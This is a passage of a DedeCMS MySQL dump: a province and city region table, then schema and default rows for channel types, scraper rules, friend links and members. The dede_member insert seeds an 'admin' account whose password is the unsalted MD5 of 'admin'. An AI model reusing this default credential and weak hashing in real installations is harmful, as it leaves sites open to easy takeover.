(2314, '河池地区', 23, 0),
(24, '海南省', 0, 0),
(2401, '海口市', 24, 0),
(2402, '三亚市', 24, 0),
(2403, '五指山市', 24, 0),
(2404, '琼海市', 24, 0),
(2405, '儋州市', 24, 0),
(2406, '琼山市', 24, 0),
(2407, '文昌市', 24, 0),
(2408, '万宁市', 24, 0),
(2409, '东方市', 24, 0),
(2410, '澄迈县', 24, 0),
(2411, '定安县', 24, 0),
(2412, '屯昌县', 24, 0),
(2413, '临高县', 24, 0),
(2414, '白沙县', 24, 0),
(2415, '昌江县', 24, 0),
(2416, '乐东县', 24, 0),
(2417, '陵水县', 24, 0),
(2418, '保亭县', 24, 0),
(2419, '琼中县', 24, 0),
(25, '云南省', 0, 0),
(2501, '昆明市', 25, 0),
(2502, '曲靖市', 25, 0),
(2503, '玉溪市', 25, 0),
(2504, '保山市', 25, 0),
(2505, '昭通市', 25, 0),
(2506, '思茅地区', 25, 0),
(2507, '临沧地区', 25, 0),
(2508, '丽江地区', 25, 0),
(2509, '文山州', 25, 0),
(2510, '红河州', 25, 0),
(2511, '西双版纳', 25, 0),
(2512, '楚雄州', 25, 0),
(2513, '大理州', 25, 0),
(2514, '德宏州', 25, 0),
(2515, '怒江州', 25, 0),
(2516, '迪庆州', 25, 0),
(26, '贵州省', 0, 0),
(2601, '贵阳市', 26, 0),
(2602, '六盘水市', 26, 0),
(2603, '遵义市', 26, 0),
(2604, '安顺市', 26, 0),
(2605, '铜仁地区', 26, 0),
(2606, '毕节地区', 26, 0),
(2607, '黔西南州', 26, 0),
(2608, '黔东南州', 26, 0),
(2609, '黔南州', 26, 0),
(27, '西藏区', 0, 0),
(2701, '拉萨市', 27, 0),
(2702, '那曲地区', 27, 0),
(2703, '昌都地区', 27, 0),
(2704, '山南地区', 27, 0),
(2705, '日喀则', 27, 0),
(2706, '阿里地区', 27, 0),
(2707, '林芝地区', 27, 0),
(28, '甘肃省', 0, 0),
(2801, '兰州市', 28, 0),
(2802, '金昌市', 28, 0),
(2803, '白银市', 28, 0),
(2804, '天水市', 28, 0),
(2805, '嘉峪关市', 28, 0),
(2806, '武威市', 28, 0),
(2807, '定西地区', 28, 0),
(2808, '平凉地区', 28, 0),
(2809, '庆阳地区', 28, 0),
(2810, '陇南地区', 28, 0),
(2811, '张掖地区', 28, 0),
(2812, '酒泉地区', 28, 0),
(2813, '甘南州', 28, 0),
(2814, '临夏州', 28, 0),
(29, '宁夏区', 0, 0),
(2901, '银川市', 29, 0),
(2902, '石嘴山市', 29, 0),
(2903, '吴忠市', 29, 0),
(2904, '固原市', 29, 0),
(30, '青海省', 0, 0),
(3001, '西宁市', 30, 0),
(3002, '海东地区', 30, 0),
(3003, '海北州', 30, 0),
(3004, '黄南州', 30, 0),
(3005, '海南州', 30, 0),
(3006, '果洛州', 30, 0),
(3007, '玉树州', 30, 0),
(3008, '海西州', 30, 0),
(31, '新疆区', 0, 0),
(3101, '乌鲁木齐', 31, 0),
(3102, '克拉玛依', 31, 0),
(3103, '石河子市', 31, 0),
(3104, '吐鲁番', 31, 0),
(3105, '哈密地区', 31, 0),
(3106, '和田地区', 31, 0),
(3107, '阿克苏', 31, 0),
(3108, '喀什地区', 31, 0),
(3109, '克孜勒苏', 31, 0),
(3110, '巴音郭楞', 31, 0),
(3111, '昌吉州', 31, 0),
(3112, '博尔塔拉', 31, 0),
(3113, '伊犁州', 31, 0),
(3117, '东城区', 1, 0),
(32, '香港区', 0, 0),
(33, '澳门区', 0, 0),
(35, '台湾省', 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_channeltype`
--

CREATE TABLE IF NOT EXISTS `dede_channeltype` (
  `id` smallint(6) NOT NULL DEFAULT '0',
  `nid` varchar(20) NOT NULL DEFAULT '',
  `typename` varchar(30) NOT NULL DEFAULT '',
  `maintable` varchar(50) NOT NULL DEFAULT 'dede_archives',
  `addtable` varchar(50) NOT NULL DEFAULT '',
  `addcon` varchar(30) NOT NULL DEFAULT '',
  `mancon` varchar(30) NOT NULL DEFAULT '',
  `editcon` varchar(30) NOT NULL DEFAULT '',
  `useraddcon` varchar(30) NOT NULL DEFAULT '',
  `usermancon` varchar(30) NOT NULL DEFAULT '',
  `usereditcon` varchar(30) NOT NULL DEFAULT '',
  `fieldset` text,
  `listfields` text,
  `allfields` text,
  `issystem` smallint(6) NOT NULL DEFAULT '0',
  `isshow` smallint(6) NOT NULL DEFAULT '1',
  `issend` smallint(6) NOT NULL DEFAULT '0',
  `arcsta` smallint(6) NOT NULL DEFAULT '-1',
  `usertype` char(10) NOT NULL DEFAULT '',
  `sendrank` smallint(6) NOT NULL DEFAULT '10',
  `isdefault` smallint(6) NOT NULL DEFAULT '0',
  `needdes` tinyint(1) NOT NULL DEFAULT '1',
  `needpic` tinyint(1) NOT NULL DEFAULT '1',
  `titlename` varchar(20) NOT NULL DEFAULT '标题',
  `onlyone` smallint(6) NOT NULL DEFAULT '0',
  `dfcid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `nid` (`nid`,`isshow`,`arcsta`,`sendrank`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_channeltype`
--

INSERT INTO `dede_channeltype` (`id`, `nid`, `typename`, `maintable`, `addtable`, `addcon`, `mancon`, `editcon`, `useraddcon`, `usermancon`, `usereditcon`, `fieldset`, `listfields`, `allfields`, `issystem`, `isshow`, `issend`, `arcsta`, `usertype`, `sendrank`, `isdefault`, `needdes`, `needpic`, `titlename`, `onlyone`, `dfcid`) VALUES
(1, 'article', '普通文章', 'dede_archives', 'dede_addonarticle', 'article_add.php', 'content_list.php', 'article_edit.php', 'article_add.php', 'content_list.php', 'article_edit.php', '<field:body itemname="文章内容" autofield="0" notsend="0" type="htmltext" isnull="true" islist="1" default=""  maxlength="" page="split">\r\n</field:body>\r\n', '', '', 1, 1, 1, -1, '', 10, 0, 1, 1, '标题', 0, 0),
(2, 'image', '图片集', 'dede_archives', 'dede_addonimages', 'album_add.php', 'content_i_list.php', 'album_edit.php', 'album_add.php', 'content_list.php', 'album_edit.php', '<field:pagestyle itemname=''页面风格'' type=''number'' isnull=''true'' default=''2'' rename='''' notsend=''1'' />\r\n<field:imgurls itemname=''图片集合'' type=''img'' isnull=''true'' default='''' rename='''' page=''split''/>\r\n<field:body itemname=''图集内容'' autofield=''0'' notsend=''0'' type=''htmltext'' isnull=''true'' islist=''0'' default=''''  maxlength=''250'' page=''''></field:body>', '', '', 1, 1, 1, -1, '', 10, 0, 1, 1, '标题', 0, 0),
(3, 'soft', '软件', 'dede_archives', 'dede_addonsoft', 'soft_add.php', 'content_i_list.php', 'soft_edit.php', '', '', '', '<field:filetype islist=''1'' itemname=''文件类型'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:language islist=''1'' itemname=''语言'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:softtype islist=''1'' itemname=''软件类型'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:accredit islist=''1'' itemname=''授权方式'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:os islist=''1'' itemname=''操作系统'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:softrank  islist=''1'' itemname=''软件等级'' type=''int'' isnull=''true'' default=''3'' rename='''' function=''GetRankStar(@me)'' notsend=''1''/>\r\n<field:officialUrl  itemname=''官方网址'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:officialDemo itemname=''演示网址'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:softsize  itemname=''软件大小'' type=''text'' isnull=''true'' default='''' rename='''' />\r\n<field:softlinks  itemname=''软件地址'' type=''softlinks'' isnull=''true'' default='''' rename='''' />\r\n<field:introduce  itemname=''详细介绍'' type=''htmltext'' isnull=''trnue'' default='''' rename='''' />\r\n<field:daccess islist=''1'' itemname=''下载级别'' type=''int'' isnull=''true'' default=''0'' rename='''' function='''' notsend=''1''/>\r\n<field:needmoney islist=''1'' itemname=''需要金币'' type=''int'' isnull=''true'' default=''0'' rename='''' function='''' notsend=''1'' />', 'filetype,language,softtype,os,accredit,softrank', '', 1, 1, 1, -1, '', 10, 0, 1, 1, '标题', 0, 0),
(-1, 'spec', '专题', 'dede_archives', 'dede_addonspec', 'spec_add.php', 'content_s_list.php', 'spec_edit.php', '', '', '', '<field:note type=''specialtopic'' isnull=''true'' default='''' rename=''''/>', '', '', 1, 1, 0, -1, '', 10, 0, 1, 1, '标题', 0, 0),
(6, 'shop', '商品', 'dede_archives', 'dede_addonshop', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '<field:body itemname="详细介绍" autofield="1" notsend="0" type="htmltext" isnull="true" islist="0" default=""  maxlength="" page="split">\r\n</field:body>\r\n\r\n\r\n<field:price itemname="市场价" autofield="1" notsend="0" type="float" isnull="true" islist="1" default=""  maxlength="" page="">\r\n</field:price>\r\n\r\n\r\n<field:trueprice itemname="优惠价" autofield="1" notsend="0" type="float" isnull="true" islist="1" default=""  maxlength="" page="">\r\n</field:trueprice>\r\n\r\n\r\n<field:brand itemname="品牌" autofield="1" notsend="0" type="text" isnull="true" islist="1" default=""  maxlength="250" page="">\r\n</field:brand>\r\n\r\n\r\n<field:units itemname="计量单位" autofield="1" notsend="0" type="text" isnull="true" islist="1" default=""  maxlength="250" page="">\r\n</field:units>\r\n\r\n\n\r\n\n\r\n', 'price,trueprice,brand,units', '', 0, 1, 1, -1, '企业', 10, 0, 1, 1, '商品名称', 0, 0),
(-8, 'infos', '分类信息', 'dede_archives', 'dede_addoninfos', 'archives_sg_add.php', 'content_sg_list.php', 'archives_sg_edit.php', 'archives_sg_add.php', 'content_sg_list.php', 'archives_sg_edit.php', '<field:channel itemname="频道id" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="10" page=""></field:channel>\r\n<field:arcrank itemname="浏览权限" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="5" page=""></field:arcrank>\r\n<field:mid itemname="会员id" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="8" page=""></field:mid>\r\n<field:click itemname="点击" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="10" page=""></field:click>\r\n<field:title itemname="标题" autofield="0" notsend="0" type="text" isnull="true" islist="1" default="0"  maxlength="60" page=""></field:title>\r\n<field:senddate itemname="发布时间" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="10" page=""></field:senddate>\r\n<field:flag itemname="推荐属性" autofield="0" notsend="0" type="checkbox" isnull="true" islist="1" default="0"  maxlength="10" page=""></field:flag>\r\n<field:litpic itemname="缩略图" autofield="0" notsend="0" type="text" isnull="true" islist="1" default="0"  maxlength="60" page=""></field:litpic>\r\n<field:userip itemname="会员IP" autofield="0" notsend="0" type="text" isnull="true" islist="0" default="0"  maxlength="15" page=""></field:userip>\r\n<field:lastpost itemname="最后评论时间" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="10" page=""></field:lastpost>\r\n<field:scores itemname="评论积分" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="8" page=""></field:scores>\r\n<field:goodpost itemname="好评数" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="8" page=""></field:goodpost>\r\n<field:badpost itemname="差评数" autofield="0" notsend="0" type="int" isnull="true" islist="1" default="0"  maxlength="8" page=""></field:badpost>\r\n<field:nativeplace itemname="地区" autofield="1" notsend="0" type="stepselect" isnull="true" islist="1" default="0"  maxlength="250" page="">\r\n</field:nativeplace>\r\n<field:infotype itemname="信息类型" autofield="1" notsend="0" type="stepselect" isnull="true" islist="1" default="0"  maxlength="250" page="">\r\n</field:infotype>\r\n<field:body itemname="信息内容" autofield="1" notsend="0" type="htmltext" isnull="true" islist="0" default=""  maxlength="250" page="">\r\n</field:body>\r\n<field:endtime itemname="截止日期" autofield="1" notsend="0" type="datetime" isnull="true" islist="1" default=""  maxlength="250" page="">\r\n</field:endtime>\r\n<field:linkman itemname="联系人" autofield="1" notsend="0" type="text" isnull="true" islist="0" default=""  maxlength="50" page="">\r\n</field:linkman>\r\n<field:tel itemname="联系电话" autofield="1" notsend="0" type="text" isnull="true" islist="0" default="" maxlength="50" page="">\r\n</field:tel>\r\n<field:email itemname="电子邮箱" autofield="1" notsend="0" type="text" isnull="true" islist="0" default=""  maxlength="50" page="">\r\n</field:email>\r\n<field:address itemname="地址" autofield="1" notsend="0" type="text" isnull="true" islist="0" default=""  maxlength="100" page="">\r\n</field:address>\r\n', 'channel,arcrank,mid,click,title,senddate,flag,litpic,lastpost,scores,goodpost,badpost,nativeplace,infotype,endtime', NULL, -1, 1, 1, -1, '', 0, 0, 0, 1, '信息标题', 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_co_htmls`
--

CREATE TABLE IF NOT EXISTS `dede_co_htmls` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `nid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(100) NOT NULL DEFAULT '',
  `url` varchar(100) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `isdown` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `isexport` tinyint(1) NOT NULL DEFAULT '0',
  `result` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `nid` (`nid`),
  KEY `typeid` (`typeid`,`title`,`url`,`dtime`,`isdown`,`isexport`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_co_mediaurls`
--

CREATE TABLE IF NOT EXISTS `dede_co_mediaurls` (
  `nid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `hash` char(32) NOT NULL DEFAULT '',
  `tofile` char(60) NOT NULL DEFAULT '',
  KEY `hash` (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_co_note`
--

CREATE TABLE IF NOT EXISTS `dede_co_note` (
  `nid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `channelid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `notename` varchar(50) NOT NULL DEFAULT '',
  `sourcelang` varchar(10) NOT NULL DEFAULT 'gb2312',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `cotime` int(10) unsigned NOT NULL DEFAULT '0',
  `pnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isok` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `usemore` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `listconfig` text,
  `itemconfig` text,
  PRIMARY KEY (`nid`),
  KEY `isok` (`isok`,`channelid`,`cotime`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_co_onepage`
--

CREATE TABLE IF NOT EXISTS `dede_co_onepage` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(60) NOT NULL DEFAULT '',
  `title` varchar(60) NOT NULL DEFAULT '',
  `issource` smallint(6) NOT NULL DEFAULT '1',
  `lang` varchar(10) NOT NULL DEFAULT 'gb2312',
  `rule` text,
  PRIMARY KEY (`id`),
  KEY `url` (`url`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=7 ;

--
-- 转存表中的数据 `dede_co_onepage`
--

INSERT INTO `dede_co_onepage` (`id`, `url`, `title`, `issource`, `lang`, `rule`) VALUES
(5, 'www.dedecms.com', '织梦网络', 1, 'gb2312', '<div class="content">{@body}<div class="cupage">'),
(4, 'www.techweb.com.cn', 'Techweb', 1, 'gb2312', '<div class="content_txt">{@body}</div>\r\n'),
(6, 'tw.news.yahoo.com', '台湾雅虎', 1, 'big5', '<div id="ynwsartcontent">{@body}</div>\r\n');

-- --------------------------------------------------------

--
-- 表的结构 `dede_co_urls`
--

CREATE TABLE IF NOT EXISTS `dede_co_urls` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `hash` varchar(32) NOT NULL DEFAULT '',
  `nid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_diyforms`
--

CREATE TABLE IF NOT EXISTS `dede_diyforms` (
  `diyid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL DEFAULT '',
  `posttemplate` varchar(50) NOT NULL,
  `viewtemplate` varchar(50) NOT NULL,
  `listtemplate` varchar(50) NOT NULL,
  `table` varchar(50) NOT NULL DEFAULT '',
  `info` text,
  `public` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`diyid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_downloads`
--

CREATE TABLE IF NOT EXISTS `dede_downloads` (
  `hash` char(32) NOT NULL,
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `downloads` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_erradd`
--

CREATE TABLE IF NOT EXISTS `dede_erradd` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aid` mediumint(8) unsigned NOT NULL,
  `mid` mediumint(8) unsigned DEFAULT NULL,
  `title` char(60) NOT NULL DEFAULT '',
  `type` smallint(6) NOT NULL DEFAULT '0',
  `errtxt` mediumtext,
  `oktxt` mediumtext,
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  KEY `id` (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_feedback`
--

CREATE TABLE IF NOT EXISTS `dede_feedback` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `arctitle` varchar(60) NOT NULL DEFAULT '',
  `ip` char(15) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `bad` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `good` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ftype` set('feedback','good','bad') NOT NULL DEFAULT 'feedback',
  `face` smallint(5) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`id`),
  KEY `aid` (`aid`,`ischeck`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_flink`
--

CREATE TABLE IF NOT EXISTS `dede_flink` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sortrank` smallint(6) NOT NULL DEFAULT '0',
  `url` char(60) NOT NULL DEFAULT '',
  `webname` char(30) NOT NULL DEFAULT '',
  `msg` char(200) NOT NULL DEFAULT '',
  `email` char(50) NOT NULL DEFAULT '',
  `logo` char(60) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ischeck` smallint(6) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=13 ;

--
-- 转存表中的数据 `dede_flink`
--

INSERT INTO `dede_flink` (`id`, `sortrank`, `url`, `webname`, `msg`, `email`, `logo`, `dtime`, `typeid`, `ischeck`) VALUES
(2, 1, 'http://www.dedecms.com', '织梦CMS官方', '', '', '', 1226375403, 1, 2),
(12, 4, 'http://www.dadou.com', '大豆网', '', '', '', 1270709522, 1, 2),
(9, 1, 'http://docs.dedecms.com/', 'DedeCMS维基手册', '', '', '', 1227772717, 1, 2),
(8, 1, 'http://bbs.dedecms.com', '织梦技术论坛', '', '', '', 1227772703, 1, 2);

-- --------------------------------------------------------

--
-- 表的结构 `dede_flinktype`
--

CREATE TABLE IF NOT EXISTS `dede_flinktype` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typename` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `dede_flinktype`
--

INSERT INTO `dede_flinktype` (`id`, `typename`) VALUES
(1, '综合网站'),
(2, '娱乐类'),
(3, '教育类'),
(4, '计算机类'),
(5, '电子商务'),
(6, '网上信息'),
(7, '论坛类'),
(8, '其它类型');

-- --------------------------------------------------------

--
-- 表的结构 `dede_freelist`
--

CREATE TABLE IF NOT EXISTS `dede_freelist` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL DEFAULT '',
  `namerule` varchar(50) NOT NULL DEFAULT '',
  `listdir` varchar(60) NOT NULL DEFAULT '',
  `defaultpage` varchar(20) NOT NULL DEFAULT '',
  `nodefault` smallint(6) NOT NULL DEFAULT '0',
  `templet` varchar(50) NOT NULL DEFAULT '',
  `edtime` int(11) NOT NULL DEFAULT '0',
  `maxpage` smallint(5) unsigned NOT NULL DEFAULT '100',
  `click` int(11) NOT NULL DEFAULT '1',
  `listtag` mediumtext,
  `keywords` varchar(100) NOT NULL DEFAULT '',
  `description` varchar(250) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_homepageset`
--

CREATE TABLE IF NOT EXISTS `dede_homepageset` (
  `templet` char(50) NOT NULL DEFAULT '',
  `position` char(30) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_homepageset`
--

INSERT INTO `dede_homepageset` (`templet`, `position`) VALUES
('default/index.htm', '../index.html');

-- --------------------------------------------------------

--
-- 表的结构 `dede_keywords`
--

CREATE TABLE IF NOT EXISTS `dede_keywords` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` char(16) NOT NULL DEFAULT '',
  `rank` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `sta` smallint(6) NOT NULL DEFAULT '1',
  `rpurl` char(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `keyword` (`keyword`,`rank`,`sta`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_log`
--

CREATE TABLE IF NOT EXISTS `dede_log` (
  `lid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `adminid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `filename` char(60) NOT NULL DEFAULT '',
  `method` char(10) NOT NULL DEFAULT '',
  `query` char(200) NOT NULL DEFAULT '',
  `cip` char(15) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member`
--

CREATE TABLE IF NOT EXISTS `dede_member` (
  `mid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mtype` varchar(20) NOT NULL DEFAULT '个人',
  `userid` char(20) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `uname` char(36) NOT NULL DEFAULT '',
  `sex` enum('男','女','保密') NOT NULL DEFAULT '保密',
  `rank` smallint(5) unsigned NOT NULL DEFAULT '0',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `exptime` smallint(6) NOT NULL DEFAULT '0',
  `money` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `email` char(50) NOT NULL DEFAULT '',
  `scores` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `matt` smallint(5) unsigned NOT NULL DEFAULT '0',
  `spacesta` smallint(6) NOT NULL DEFAULT '0',
  `face` char(50) NOT NULL DEFAULT '',
  `safequestion` smallint(5) unsigned NOT NULL DEFAULT '0',
  `safeanswer` char(30) NOT NULL DEFAULT '',
  `jointime` int(10) unsigned NOT NULL DEFAULT '0',
  `joinip` char(16) NOT NULL DEFAULT '',
  `logintime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginip` char(16) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`),
  KEY `userid` (`userid`,`sex`),
  KEY `logintime` (`logintime`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `dede_member`
--

INSERT INTO `dede_member` (`mid`, `mtype`, `userid`, `pwd`, `uname`, `sex`, `rank`, `uptime`, `exptime`, `money`, `email`, `scores`, `matt`, `spacesta`, `face`, `safequestion`, `safeanswer`, `jointime`, `joinip`, `logintime`, `loginip`) VALUES
(1, '个人', 'admin', '21232f297a57a5a743894a0e4a801fc3', 'admin', '男', 100, 0, 0, 0, '', 10000, 10, 0, '', 0, '', 1334461735, '', 0, '');

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_company`
--

CREATE TABLE IF NOT EXISTS `dede_member_company` (
  `mid` mediumint(8) NOT NULL AUTO_INCREMENT,
  `company` varchar(36) NOT NULL DEFAULT '',
  `product` varchar(50) NOT NULL DEFAULT '',
  `place` smallint(5) unsigned NOT NULL DEFAULT '0',
  `vocation` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cosize` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tel` varchar(30) NOT NULL DEFAULT '',
  `fax` varchar(30) NOT NULL DEFAULT '',
  `linkman` varchar(20) NOT NULL DEFAULT '',
  `address` varchar(50) NOT NULL DEFAULT '',
  `mobile` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `url` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `introduce` text,
  `comface` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_feed`
--

CREATE TABLE IF NOT EXISTS `dede_member_feed` (
  `fid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `userid` char(20) NOT NULL DEFAULT '',
  `uname` char(36) NOT NULL DEFAULT '',
  `type` char(20) CHARACTER SET gb2312 NOT NULL DEFAULT '0',
  `aid` mediumint(8) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `title` char(253) NOT NULL,
  `note` char(200) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL,
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_flink`
--

CREATE TABLE IF NOT EXISTS `dede_member_flink` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` varchar(30) NOT NULL DEFAULT '',
  `url` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_friends`
--

CREATE TABLE IF NOT EXISTS `dede_member_friends` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `fid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `floginid` char(20) NOT NULL DEFAULT '',
  `funame` char(36) NOT NULL DEFAULT '',
  `mid` mediumint(8) NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `ftype` tinyint(4) NOT NULL DEFAULT '0',
  `groupid` int(8) NOT NULL DEFAULT '1',
  `description` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `fid` (`fid`,`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_group`
--

CREATE TABLE IF NOT EXISTS `dede_member_group` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `groupname` varchar(50) NOT NULL,
  `mid` int(8) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `dede_member_group`
--

INSERT INTO `dede_member_group` (`id`, `groupname`, `mid`) VALUES
(1, '朋友', 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_member_guestbook`
--

CREATE TABLE IF NOT EXISTS `dede_member_guestbook` (
  `aid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `gid` varchar(20) NOT NULL DEFAULT '0',
